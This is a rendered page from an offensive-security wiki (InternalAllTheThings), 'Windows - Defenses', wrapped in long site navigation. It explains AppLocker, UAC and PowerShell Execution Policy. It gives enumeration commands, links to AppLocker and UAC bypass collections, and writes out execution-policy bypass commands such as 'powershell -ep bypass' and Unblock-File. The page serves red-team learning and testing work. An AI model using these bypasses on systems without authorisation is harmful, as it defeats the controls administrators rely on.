+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Redteam
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            Redteam
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_1" id="__nav_11_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Access
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_1">
+            <span class="md-nav__icon md-icon"></span>
+            Access
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/html-smuggling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTML Smuggling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/initial-access/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Initial Access
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/office-attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Office - Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/phishing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Phishing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/web-attack-surface/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Attack Surface
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/windows-download-execute/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Download and execute methods
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/windows-using-credentials/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Using credentials
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_2" id="__nav_11_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Escalation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_2">
+            <span class="md-nav__icon md-icon"></span>
+            Escalation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../escalation/linux-privilege-escalation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux - Privilege Escalation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../escalation/windows-privilege-escalation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Privilege Escalation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_11_3" id="__nav_11_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Evasion
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_11_3">
+            <span class="md-nav__icon md-icon"></span>
+            Evasion
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../edr-bypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Endpoint Detection and Response
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../elastic-edr/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Elastic EDR
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux-evasion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux - Evasion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../proxy-bypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Proxy Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows-amsi-bypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - AMSI Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Windows - Defenses
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Defenses
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#applocker" class="md-nav__link">
+    <span class="md-ellipsis">
+      AppLocker
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-account-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Account Control
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dpapi" class="md-nav__link">
+    <span class="md-ellipsis">
+      DPAPI
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Powershell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Powershell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execution-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution Policy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#anti-malware-scan-interface" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anti Malware Scan Interface
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#just-enough-administration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Just Enough Administration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#constrained-language-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      Constrained Language Mode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script-block-and-module-logging" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script Block and Module Logging
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell Transcript
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#securestring" class="md-nav__link">
+    <span class="md-ellipsis">
+      SecureString
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#protected-process-light" class="md-nav__link">
+    <span class="md-ellipsis">
+      Protected Process Light
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-guard" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Guard
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#event-tracing-for-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Event Tracing for Windows
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-surface-reduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Surface Reduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender-antivirus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Defender Antivirus
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender-application-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Defender Application Control
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender-firewall" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Defender Firewall
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-information-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Information Protection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bitlocker-drive-encryption" class="md-nav__link">
+    <span class="md-ellipsis">
+      BitLocker Drive Encryption
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows-dpapi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - DPAPI
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_4" id="__nav_11_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Persistence
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_4">
+            <span class="md-nav__icon md-icon"></span>
+            Persistence
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../persistence/linux-persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux - Persistence
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../persistence/rdp-persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    RDP - Persistence
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../persistence/windows-persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Persistence
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_5" id="__nav_11_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_5">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pivoting/network-pivoting-techniques/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Network Pivoting Techniques
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#applocker" class="md-nav__link">
+    <span class="md-ellipsis">
+      AppLocker
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-account-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Account Control
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dpapi" class="md-nav__link">
+    <span class="md-ellipsis">
+      DPAPI
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Powershell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Powershell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execution-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution Policy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#anti-malware-scan-interface" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anti Malware Scan Interface
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#just-enough-administration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Just Enough Administration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#constrained-language-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      Constrained Language Mode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script-block-and-module-logging" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script Block and Module Logging
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell Transcript
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#securestring" class="md-nav__link">
+    <span class="md-ellipsis">
+      SecureString
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#protected-process-light" class="md-nav__link">
+    <span class="md-ellipsis">
+      Protected Process Light
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-guard" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Guard
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#event-tracing-for-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Event Tracing for Windows
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-surface-reduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Surface Reduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender-antivirus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Defender Antivirus
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender-application-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Defender Application Control
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender-firewall" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Defender Firewall
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-information-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows Information Protection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bitlocker-drive-encryption" class="md-nav__link">
+    <span class="md-ellipsis">
+      BitLocker Drive Encryption
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+	
+                  
+
+
+  
+    <a href="https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/evasion/windows-defenses.md" title="Edit this page" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+    
+      
+    
+    <a href="https://github.com/swisskyrepo/InternalAllTheThings/raw/main/docs/redteam/evasion/windows-defenses.md" title="View source of this page" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="windows-defenses">Windows - Defenses</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#applocker">AppLocker</a></li>
+<li><a href="#user-account-control">User Account Control</a></li>
+<li><a href="#dpapi">DPAPI</a></li>
+<li><a href="#powershell">Powershell</a><ul>
+<li><a href="#execution-policy">Execution Policy</a></li>
+<li><a href="#anti-malware-scan-interface">Anti Malware Scan Interface</a></li>
+<li><a href="#just-enough-administration">Just Enough Administration</a></li>
+<li><a href="#constrained-language-mode">Contrained Language Mode</a></li>
+<li><a href="#script-block-and-module-logging">Script Block and Module Logging</a></li>
+<li><a href="#powershell-transcript">PowerShell Transcript</a></li>
+<li><a href="#securestring">SecureString</a></li>
+</ul>
+</li>
+<li><a href="#protected-process-light">Protected Process Light</a></li>
+<li><a href="#credential-guard">Credential Guard</a></li>
+<li><a href="#event-tracing-for-windows">Event Tracing for Windows</a></li>
+<li><a href="#attack-surface-reduction">Attack Surface Reduction</a></li>
+<li><a href="#windows-defender-antivirus">Windows Defender Antivirus</a></li>
+<li><a href="#windows-defender-application-control">Windows Defender Application Control</a></li>
+<li><a href="#windows-defender-firewall">Windows Defender Firewall</a></li>
+<li><a href="#windows-information-protection">Windows Information Protection</a></li>
+</ul>
+<h2 id="applocker">AppLocker</h2>
+<blockquote>
+<p>AppLocker is a security feature in Microsoft Windows that provides administrators with the ability to control which applications and files users are allowed to run on their systems. The rules can be based on various criteria, such as the file path, file publisher, or file hash, and can be applied to specific users or groups.</p>
+</blockquote>
+<ul>
+<li>
+<p>Enumerate Local AppLocker Effective Policy
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">PowerView</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-AppLockerPolicy</span> <span class="n">-Effective</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">RuleCollections</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">PowerView</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-AppLockerPolicy</span> <span class="n">-effective</span> <span class="n">-xml</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">SrpV2</span><span class="p">\</span><span class="n">Exe</span> <span class="c"># (Keys: Appx, Dll, Exe, Msi and Script</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>AppLocker Bypass</p>
+<ul>
+<li>By default, <code>C:\Windows</code> is not blocked, and <code>C:\Windows\Tasks</code> is writtable by any users</li>
+<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">api0cradle/UltimateAppLockerByPassList/Generic-AppLockerbypasses.md</a></li>
+<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md">api0cradle/UltimateAppLockerByPassList/VerifiedAppLockerBypasses.md</a></li>
+<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md">api0cradle/UltimateAppLockerByPassList/DLL-Execution.md</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="user-account-control">User Account Control</h2>
+<p>UAC stands for User Account Control. It is a security feature introduced by Microsoft in Windows Vista and is present in all subsequent versions of the Windows operating system. UAC helps mitigate the impact of malware and helps protect users by asking for permission or an administrator's password before allowing changes to be made to the system that could potentially affect all users of the computer.</p>
+<ul>
+<li>Check if UAC is enabled
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">REG</span> <span class="n">QUERY</span> <span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">System</span><span class="p">\</span> <span class="p">/</span><span class="n">v</span> <span class="n">EnableLUA</span>
+</code></pre></div></li>
+<li>Check UAC level
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
+</code></pre></div></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>EnableLUA</th>
+<th>LocalAccountTokenFilterPolicy</th>
+<th>FilterAdministratorToken</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>/</td>
+<td>/</td>
+<td>No UAC</td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+<td>/</td>
+<td>No UAC</td>
+</tr>
+<tr>
+<td>1</td>
+<td>0</td>
+<td>0</td>
+<td>No UAC for RID 500</td>
+</tr>
+<tr>
+<td>1</td>
+<td>0</td>
+<td>1</td>
+<td>UAC for Everyone</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>UAC Bypass<ul>
+<li><a href="https://www.elastic.co/guide/en/security/current/bypass-uac-via-sdclt.html">AutoElevated binary signed by Microsoft</a> - <code>msconfig</code>, <code>sdclt.exe</code>, <code>eventvwr.exe</code>, etc</li>
+<li><a href="https://github.com/hfiref0x/UACME">hfiref0x/UACME</a> - Defeating Windows User Account Control</li>
+</ul>
+</li>
+</ul>
+<h2 id="dpapi">DPAPI</h2>
+<p>Refer to <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20DPAPI.md">PayloadsAllTheThings/Windows - DPAPI.md</a></p>
+<h2 id="powershell">Powershell</h2>
+<h3 id="execution-policy">Execution Policy</h3>
+<blockquote>
+<p>PowerShell Execution Policy is a security feature that controls how scripts run on a system. It helps prevent unauthorized scripts from executing, but it is not a security boundary—it only prevents accidental execution of unsigned scripts.</p>
+</blockquote>
+<ul>
+<li>Check current policy
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Get-ExecutionPolicy</span>
+</code></pre></div></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Policy</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Restricted</td>
+<td>No scripts allowed (default in some systems).</td>
+</tr>
+<tr>
+<td>AllSigned</td>
+<td>Only runs signed scripts.</td>
+</tr>
+<tr>
+<td>RemoteSigned</td>
+<td>Local scripts run, remote scripts must be signed.</td>
+</tr>
+<tr>
+<td>Unrestricted</td>
+<td>Runs all scripts, warns for remote scripts.</td>
+</tr>
+<tr>
+<td>Bypass</td>
+<td>No restrictions; all scripts run.</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><code>Restricted</code>: it prevents the execution of all scripts (the default for workstations).</li>
+<li><code>RemoteSigned</code>: it blocks the execution of unsigned scripts downloaded from the Internet, but allows the execution of "local" scripts (the default on servers). The command <code>Unblock-File</code> can be used to remove the Mark-of-the-Web (MotW) and make a downloaded script look like a "local" script.
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># Bypass</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">Unblock-File</span> <span class="n">my</span><span class="o">-file</span><span class="n">-from-internet</span>
+</code></pre></div></li>
+<li><code>AllSigned</code>: it blocks unsigned scripts. This is the most secure option.
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c"># Bypass</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">Get-Content</span> <span class="p">.\</span><span class="n">run</span><span class="p">.</span><span class="n">ps1</span> <span class="p">|</span> <span class="nb">Invoke-Expression</span>
+</code></pre></div></li>
+</ul>
+<p>You can just run <code>powershell.exe</code> with the option <code>-ep Bypass</code>, or use the built-in command <code>Set-ExecutionPolicy</code>. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-Scope</span> <span class="k">Process</span> <span class="n">-Force</span>
+</code></pre></div>
